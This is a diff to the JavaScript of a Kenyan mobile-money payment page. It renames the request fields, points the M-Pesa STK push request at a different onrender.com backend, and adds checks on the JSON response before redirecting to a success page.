@@ -280,13 +280,9 @@
     const modal = document.getElementById('processing-window');
     const statusText = document.getElementById('status-text');
 
-    // Strict validation requirement matching local specifications
-    const kenyaPhoneRegex = /^(07|01|7|1)\d{8}$/;
-
     function validateForm() {
         let rawValue = phoneInput.value.trim();
         
-        // Normalize checking logic if users append a leading 0 manually
         let testValue = rawValue;
         if (rawValue.startsWith('0')) {
             testValue = rawValue;
@@ -296,7 +292,6 @@
 
         const isPhoneValid = /^(07|01)\d{8}$/.test(testValue);
 
-        // Real-time error monitoring rules configuration
         if (rawValue.length >= 9) {
             if (!isPhoneValid) {
                 phoneError.style.display = "block";
@@ -310,7 +305,6 @@
                 payBtn.disabled = false;
             }
         } else {
-            // Keep button disabled if string length requirements are short
             phoneError.style.display = "none";
             inputHint.style.display = "block";
             payBtn.classList.remove('active');
@@ -325,10 +319,10 @@
     payBtn.addEventListener('click', async () => {
         modal.style.display = "flex";
         
+        // Visual indicator adjustments for initiation stage
         statusText.innerText = "SENDING STK PUSH... ";
         statusText.style.color = "var(--status-orange)";
         
-        // Process number string variant extraction to append prefix safe payloads
         let formattedNumber = phoneInput.value.trim();
         if (formattedNumber.startsWith('0')) {
             formattedNumber = '254' + formattedNumber.substring(1);
@@ -336,19 +330,25 @@
             formattedNumber = '254' + formattedNumber;
         }
 
+        // Updated interface keys matching your Node deployment parameters
         const payload = {
-            phone_number: formattedNumber,
-            amount: parseInt(storageFee, 10) // Dynamically passing local storage values safely
+            phone: formattedNumber,
+            amount: Number(storageFee)
         };
 
         try {
-            const response = await fetch('https://stkpush111.onrender.com/pay', {
+            // Target route switched directly to your live operational render context
+            const response = await fetch('https://server100-847a.onrender.com/pay', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            if (response.ok) {
+            const data = await response.json();
+
+            // Check if backend execution response evaluates positively
+            if (response.ok && (data.success === true || data.status === "Success" || data.status === true)) {
+                // Adjust status text styling to green when sent successfully
                 statusText.innerText = "STK PUSH SENT! ENTER PIN";
                 statusText.style.color = "var(--safaricom-green)";
                 
@@ -356,7 +356,7 @@
                     window.location.href = "success.html"; 
                 }, 6000);
             } else {
-                throw new Error("System Busy. Please try again.");
+                throw new Error(data.message || "System Busy. Please try again.");
             }
         } catch (error) {
             statusText.innerText = "ERROR: " + error.message;
@@ -369,4 +369,4 @@
 </script>
 
 </body>
-</html>
+    </html>
